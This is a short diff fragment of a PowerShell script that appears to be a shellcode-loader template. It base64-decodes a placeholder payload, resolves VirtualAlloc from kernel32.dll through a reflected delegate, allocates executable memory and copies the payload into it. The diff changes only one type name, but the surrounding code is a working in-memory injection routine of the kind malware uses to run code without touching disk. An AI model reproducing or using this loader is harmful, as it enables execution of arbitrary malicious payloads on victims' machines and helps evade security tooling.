@@ -20,7 +20,7 @@ function var4 {
         return $var6.CreateType()
 }
 
-[Byte[]]$var8 = [System.Convert]::FromBase64String("[PAYLOAD]")
+[Byte[]]$var8 = [Convert]::FromBase64String("[PAYLOAD]")
 
 $var9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((var2 kernel32.dll VirtualAlloc), (var4 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var8.Length,0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($var8, 0, $var9, $var8.length)
